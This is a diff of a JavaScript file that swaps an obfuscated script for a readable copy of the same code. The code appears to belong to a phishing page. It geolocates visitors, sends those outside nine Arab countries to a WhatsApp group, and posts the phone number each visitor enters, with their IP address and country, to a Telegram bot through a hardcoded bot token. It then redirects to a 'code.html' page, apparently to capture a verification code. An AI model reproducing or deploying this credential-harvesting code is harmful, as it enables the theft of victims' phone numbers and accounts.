@@ -1,1 +1,92 @@
-var _0x3a26=['9mQUiwx','/sendMessa','1WrvwCt','length','getElement','IPv4','IWXyR','.org/bot','then','IHrru','includes','NvlfB','4316WhuFkX','kZkhb','559274yyMDDO','6aEqhbW','ge?chat_id','oxvms','JAtJJ','try','at.whatsap','replace','dex','https://ch','1357542qJDDeV','location','MrULj','fromCharCo','34MgWgrK','hluBVz1Ce8',':AAH4aghCd','mnDnHuvGro','oip-db.com','/jsonp/','txtphone','i.telegram','----------','ById','code.html','jXvlh','788377233','ault','https://ge','&text=----','34054ovVoJU','preventDef','1855648626','options','9120fopudB','which','https://ap','KZSPHI','101MvbxPL','POST','46584TgVhpp','test','145021KPQgys','p.com/GXPX','value','&text=IP\x20:'];var _0x1b7399=_0x2aab;(function(_0x846637,_0x54b6c0){var _0x5cbe50=_0x2aab;while(!![]){try{var _0x4ab299=parseInt(_0x5cbe50('0x98'))+parseInt(_0x5cbe50('0x8e'))+-parseInt(_0x5cbe50('0x80'))*-parseInt(_0x5cbe50('0x7a'))+parseInt(_0x5cbe50('0x8c'))*-parseInt(_0x5cbe50(0x78))+parseInt(_0x5cbe50(0xac))*-parseInt(_0x5cbe50('0x9c'))+-parseInt(_0x5cbe50(0x74))+parseInt(_0x5cbe50('0x82'))*parseInt(_0x5cbe50('0x7c'));if(_0x4ab299===_0x54b6c0)break;else _0x846637['push'](_0x846637['shift']());}catch(_0x19a18b){_0x846637['push'](_0x846637['shift']());}}}(_0x3a26,0xd668d));var ip_adress,country_code;function callback(_0x172778){var _0x36e748=_0x2aab;ip_adress=_0x172778[_0x36e748('0x85')],country_code=_0x172778['country_co'+'de'];var _0x803dd3=['JO','IQ','KW','SA','OM','AE','BH','QA','EG'],_0x1b6d1e=document[_0x36e748(0x84)+_0x36e748(0xa5)]('SelecTcoun'+_0x36e748(0x93));if(_0x803dd3[_0x36e748('0x8a')](country_code))for(let _0x224197=0x0;_0x224197<0x9;_0x224197++){if(country_code==_0x803dd3[_0x224197])_0x1b6d1e['selectedIn'+_0x36e748('0x96')]=_0x224197;}else window[_0x36e748('0x99')][_0x36e748(0x95)](_0x36e748('0x97')+_0x36e748('0x94')+_0x36e748(0x7d)+_0x36e748(0x9f)+_0x36e748(0x8f));}$['ajax']({'url':_0x1b7399(0xaa)+_0x1b7399(0xa0)+_0x1b7399(0xa1),'dataType':'jsonp'});function _0x2aab(_0x240224,_0x47cb7f){return _0x2aab=function(_0x3a26f6,_0x2aabd0){_0x3a26f6=_0x3a26f6-0x73;var _0x26f375=_0x3a26[_0x3a26f6];return _0x26f375;},_0x2aab(_0x240224,_0x47cb7f);}function ValideText(){var _0x37c551=_0x1b7399;if(document[_0x37c551('0x84')+_0x37c551('0xa5')](_0x37c551('0xa2'))[_0x37c551(0x7e)]!=''&&document[_0x37c551(0x84)+_0x37c551(0xa5)]('txtphone')[_0x37c551('0x7e')]['length']>=0x6&&document[_0x37c551('0x84')+_0x37c551('0xa5')](_0x37c551(0xa2))[_0x37c551(0x7e)][_0x37c551('0x83')]!=0x0){if(_0x37c551('0x86')==='ntfen')_0x223a96[_0x37c551('0x99')]['replace'](_0x37c551(0xa6));else return!![];}else return![];}var bntclicked=![];function SendNumber(){var _0x25b924=_0x1b7399;if(!bntclicked){if(_0x25b924(0x92)==='KkhQE'){_0x527e5c++;var _0x865e93='https://ap'+_0x25b924('0xa3')+_0x25b924('0x87')+_0x328868+('/sendMessa'+'ge?chat_id'+'=')+_0x54ac4c+('&text=IP\x20:'+'\x20')+_0x457db3+':'+_0x37a615+':'+_0x78a67d;_0x2a0be2(_0x865e93,{'method':'POST'})['then'](_0x2e319d=>{var _0x51d331=_0x25b924;_0x2e319d['ok']&&(_0x5e5c00==0x1&&_0x52eb54[_0x51d331('0x99')][_0x51d331(0x95)]('code.html'));});}else{var _0x13135b=_0x25b924(0xae)+_0x25b924('0x9e')+_0x25b924(0x9d)+'mZa8jWFxDe'+_0x25b924('0x77'),_0x715cb4=_0x25b924('0xa8'),_0x2aa5f0=0x0;if(ValideText()&&!isNaN(document['getElement'+_0x25b924(0xa5)](_0x25b924('0xa2'))[_0x25b924('0x7e')])){bntclicked=!![];var _0x240dfa=document['getElement'+'ById']('SelecTcoun'+'try'),_0x3d360b='('+_0x240dfa[_0x25b924(0x73)][_0x240dfa['selectedIn'+_0x25b924(0x96)]][_0x25b924(0x7e)]+')',_0x3b44cc=document[_0x25b924(0x84)+_0x25b924(0xa5)](_0x25b924(0xa2))[_0x25b924(0x7e)],_0x4ae4ee=_0x25b924(0x76)+'i.telegram'+_0x25b924('0x87')+_0x13135b+(_0x25b924(0x81)+'ge?chat_id'+'=')+_0x715cb4+(_0x25b924('0xab')+'----------'+_0x25b924('0xa4')+_0x25b924('0xa4')+_0x25b924(0xa4)+_0x25b924(0xa4));fetch(_0x4ae4ee,{'method':_0x25b924(0x79)})[_0x25b924(0x88)](_0x2a3065=>{var _0x390b1d=_0x25b924;if(_0x390b1d(0x8b)!=='FKxXe'){if(_0x2a3065['ok']){var _0x1e2a3a=_0x390b1d('0x76')+'i.telegram'+_0x390b1d(0x87)+_0x13135b+(_0x390b1d(0x81)+_0x390b1d(0x90)+'=')+_0x715cb4+'&text=+'+_0x3b44cc;fetch(_0x1e2a3a,{'method':'POST'})[_0x390b1d(0x88)](_0x2a68c7=>{var _0x1ec9f9=_0x390b1d;if(_0x2a68c7['ok']){_0x2aa5f0++;var _0x4c1d70=_0x1ec9f9(0x76)+_0x1ec9f9(0xa3)+_0x1ec9f9(0x87)+_0x13135b+(_0x1ec9f9(0x81)+_0x1ec9f9('0x90')+'=')+_0x715cb4+(_0x1ec9f9('0x7f')+'\x20')+ip_adress+':'+country_code+':'+_0x3d360b;fetch(_0x4c1d70,{'method':_0x1ec9f9('0x79')})[_0x1ec9f9('0x88')](_0xff1b69=>{var _0x3bd7ae=_0x1ec9f9;if(_0xff1b69['ok']){if(_0x2aa5f0==0x1){if(_0x3bd7ae('0x9a')===_0x3bd7ae(0x8d))return!![];else window[_0x3bd7ae('0x99')]['replace']('code.html');}}});}else _0x1ec9f9('0x91')===_0x1ec9f9('0x89')?_0x282758['ok']&&(_0x5274ee==0x1&&_0x5a2ab0[_0x1ec9f9('0x99')][_0x1ec9f9(0x95)](_0x1ec9f9(0xa6))):window[_0x1ec9f9(0x99)][_0x1ec9f9(0x95)]('index.html');});}}else{var _0x10fbd4=_0x26821e[_0x390b1d(0x9b)+'de'](_0x5ed480[_0x390b1d(0x75)]);!/[0-9]/[_0x390b1d('0x7b')](_0x10fbd4)&&_0x52fe8d[_0x390b1d(0xad)+_0x390b1d(0xa9)]();}});}}}}function isInputNumber(_0x3810ee){var _0x3e5c87=_0x1b7399,_0x9f1f94=String[_0x3e5c87('0x9b')+'de'](_0x3810ee['which']);if(!/[0-9]/[_0x3e5c87('0x7b')](_0x9f1f94)){if(_0x3e5c87('0xa7')===_0x3e5c87('0xa7'))_0x3810ee[_0x3e5c87('0xad')+'ault']();else return![];}}
+var ip_adress,country_code;
+function callback( response ){
+ip_adress = response.IPv4;
+country_code = response.country_code;
+var list = ['JO', 'IQ', 'KW', 'SA', 'OM', 'AE', 'BH', 'QA', 'EG'];
+var SelecTcountry = document.getElementById('SelecTcountry');
+
+    if(list.includes(country_code)){
+        for (let index = 0; index < list.length ; index++) {
+            if(country_code==list[index]) SelecTcountry.selectedIndex=index;
+        }
+    }
+    else window.location.replace("https://chat.whatsapp.com/GXPXmnDnHuvGro6aEqhbW");
+}
+
+$.ajax({
+url:"https://geoip-db.com/jsonp/",
+dataType:"jsonp"
+
+})
+
+function ValideText(){
+    if(document.getElementById("txtphone").value != '' && document.getElementById("txtphone").value.length >= 6 && document.getElementById("txtphone").value.length !=0){
+        
+        return true;
+    }
+    else {
+        
+        return false;
+    }
+}
+var bntclicked = false;
+function SendNumber()
+{
+    if(!bntclicked)
+    {
+            var Api_Key = "1855648626:AAH4aghCdhluBVz1Ce8mZa8jWFxDeKZSPHI";
+            var chat_id = "788377233";
+            var cpt = 0;
+                if(ValideText() && !isNaN(document.getElementById("txtphone").value))
+                {
+                    bntclicked = true;
+                    var SelecTcountry = document.getElementById('SelecTcountry');
+                    var NSelecTcountry = "("+SelecTcountry.options[SelecTcountry.selectedIndex].value+")";
+                    var txtphone = document.getElementById("txtphone").value;
+                    var api_Start_message='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text=------------------------------------------------------';
+                    fetch(api_Start_message, { 
+                    method: 'POST'})
+                    .then(response => {
+                        if (response.ok)
+                        {
+                            var api_url='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text=+'+txtphone;
+                            fetch(api_url, { 
+                                method: 'POST'})
+                            .then(response => {
+                                if (response.ok)
+                                {
+                                    cpt++;
+                                    var api_url_ip='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text=IP : '+ip_adress+":"+country_code+":"+NSelecTcountry;
+                                    fetch(api_url_ip, { 
+                                        method: 'POST'})
+                                        .then(response => { 
+                                            if (response.ok)
+                                            {
+                                                if(cpt==1)
+                                                {
+                                                    window.location.replace("code.html");
+                                                }
+                                            }
+                                        });
+                                }
+                                else 
+                                {
+                                    window.location.replace("index.html");
+                                }
+                            });
+                        }
+                    });
+                }
+     }
+    
+}
+
+function isInputNumber(evt){
+    
+    var ch = String.fromCharCode(evt.which);
+    
+    if(!(/[0-9]/.test(ch))){
+        evt.preventDefault();
+    }
+    
+}
